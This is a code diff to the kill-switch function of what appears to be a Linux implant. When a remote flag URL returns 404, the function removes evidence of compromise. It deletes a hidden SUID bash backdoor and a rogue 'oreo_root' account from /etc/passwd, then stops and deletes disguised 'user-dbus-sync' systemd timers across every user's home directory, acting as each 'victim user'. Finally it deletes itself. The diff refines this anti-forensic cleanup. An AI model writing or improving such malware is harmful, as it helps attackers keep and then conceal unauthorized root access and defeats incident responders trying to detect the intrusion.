@@ -34,71 +34,87 @@ def check_kill_switch():
     import glob
     import os
     import time
+    import pwd
     print("[*] Checking kill switch...")
     
     try:
-        # 1. Use built-in urllib to avoid 'requests' dependency errors in the root process
         unique_url = f"{BASE_FLAG_URL}?nocache={time.time()}"
         req = urllib.request.Request(unique_url, method="HEAD")
         
         try:
             with urllib.request.urlopen(req) as response:
-                return False  # Status 200 OK: Flag still exists (or is still cached)
+                return False  # Status 200 OK: Flag still exists
                 
         except urllib.error.HTTPError as e:
-            # If the HTTP error is exactly a 404
             if e.code == 404:
                 print("[!] Flag not found (404)! Initiating self-destruct...")
                 
                 # --- STEP 1: Remove SUID backdoor ---
-                hidden_bash = "/var/tmp/.cache_sys"
-                try:
-                    if os.path.exists(hidden_bash):
-                        os.remove(hidden_bash)
-                        print(f"[*] SUID backdoor {hidden_bash} scrubbed.")
-                except Exception as err:
-                    print(f"[-] Could not remove SUID backdoor: {err}")
+                if os.geteuid() == 0:
+                    hidden_bash = "/var/tmp/.cache_sys"
+                    try:
+                        if os.path.exists(hidden_bash):
+                            os.remove(hidden_bash)
+                            print(f"[*] SUID backdoor {hidden_bash} scrubbed.")
+                    except Exception as err:
+                        print(f"[-] Could not remove SUID backdoor: {err}")
 
                 # --- STEP 1.5: Remove oreo_root backdoor ---
-                try:
-                    # Check if the user exists first to avoid unnecessary writes
-                    with open("/etc/passwd", "r") as f:
-                        passwd_content = f.read()
-                    
-                    if "oreo_root:" in passwd_content:
-                        # Use sed to delete the specific line from /etc/passwd
-                        subprocess.run(["sed", "-i", "/^oreo_root:/d", "/etc/passwd"], check=True)
-                        print("[*] Rogue user 'oreo_root' scrubbed from /etc/passwd.")
-                except Exception as err:
-                    print(f"[-] Could not remove oreo_root user: {err}")
+                if os.geteuid() == 0:
+                    try:
+                        with open("/etc/passwd", "r") as f:
+                            if "oreo_root:" in f.read():
+                                # userdel is the standard and reliable way to remove a user
+                                subprocess.run(["userdel", "-f", "oreo_root"], check=False, stderr=subprocess.DEVNULL)
+                                # Fallback to sed just in case
+                                subprocess.run(["sed", "-i", "/^oreo_root:/d", "/etc/passwd"], check=False, stderr=subprocess.DEVNULL)
+                                print("[*] Rogue user 'oreo_root' scrubbed from system.")
+                    except Exception as err:
+                        print(f"[-] Could not remove oreo_root user: {err}")
 
-                # --- STEP 2: Clean up persistence files aggressively ---
+                # --- STEP 2: Clean up persistence & destroy ghost timers ---
                 service_name = "user-dbus-sync"
                 
-                # Check current user home + all /home/ directories if running as root
-                target_dirs = [os.path.expanduser("~/.config/systemd/user")]
                 if os.geteuid() == 0:
-                    target_dirs.extend(glob.glob("/home/*/.config/systemd/user"))
+                    # If running as root, clean up ALL users' systemd daemons
+                    for target_dir in glob.glob("/home/*/.config/systemd/user"):
+                        try:
+                            username = target_dir.split('/')[2]
+                            uid = pwd.getpwnam(username).pw_uid
+                            xdg = f"/run/user/{uid}"
+                            
+                            # Prefix to run systemctl AS the specific victim user
+                            cmd_prefix = ["sudo", "-u", username, "env", f"XDG_RUNTIME_DIR={xdg}", "systemctl", "--user"]
+                            
+                            # 1. Disable and stop the timer forever
+                            subprocess.run(cmd_prefix + ["disable", "--now", f"{service_name}.timer", f"{service_name}.service"], stderr=subprocess.DEVNULL)
+                            
+                            # 2. Delete the physical files
+                            svc_path = os.path.join(target_dir, f"{service_name}.service")
+                            tmr_path = os.path.join(target_dir, f"{service_name}.timer")
+                            if os.path.exists(svc_path): os.remove(svc_path)
+                            if os.path.exists(tmr_path): os.remove(tmr_path)
+                            
+                            # 3. Clear memory
+                            subprocess.run(cmd_prefix + ["daemon-reload"], stderr=subprocess.DEVNULL)
+                            subprocess.run(cmd_prefix + ["reset-failed"], stderr=subprocess.DEVNULL)
+                            print(f"[*] Persistence destroyed for user: {username}")
+                        except Exception:
+                            pass
+                else:
+                    # If running as normal user, clean up our own daemon
+                    target_dir = os.path.expanduser("~/.config/systemd/user")
                     
-                for d in target_dirs:
-                    try:
-                        svc_path = os.path.join(d, f"{service_name}.service")
-                        tmr_path = os.path.join(d, f"{service_name}.timer")
-                        if os.path.exists(svc_path): os.remove(svc_path)
-                        if os.path.exists(tmr_path): os.remove(tmr_path)
-                    except Exception:
-                        pass # Ignore errors for directories we don't own
-
-                # Try to stop the timer locally to kill the active daemon memory
-                subprocess.run(
-                    ["systemctl", "--user", "stop", f"{service_name}.timer"],
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-                )
-                subprocess.run(
-                    ["systemctl", "--user", "daemon-reload"], 
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-                )
-                print("[*] Persistence mechanisms scrubbed.")
+                    subprocess.run(["systemctl", "--user", "disable", "--now", f"{service_name}.timer", f"{service_name}.service"], stderr=subprocess.DEVNULL)
+                    
+                    svc_path = os.path.join(target_dir, f"{service_name}.service")
+                    tmr_path = os.path.join(target_dir, f"{service_name}.timer")
+                    if os.path.exists(svc_path): os.remove(svc_path)
+                    if os.path.exists(tmr_path): os.remove(tmr_path)
+                    
+                    subprocess.run(["systemctl", "--user", "daemon-reload"], stderr=subprocess.DEVNULL)
+                    subprocess.run(["systemctl", "--user", "reset-failed"], stderr=subprocess.DEVNULL)
+                    print("[*] Persistence destroyed for current user.")
 
                 # --- STEP 3: Delete the script itself ---
                 try:
@@ -111,7 +127,6 @@ def check_kill_switch():
                 return True 
                 
             else:
-                # Other HTTP errors (403, 500, etc.)
                 return False
 
     except Exception as e:
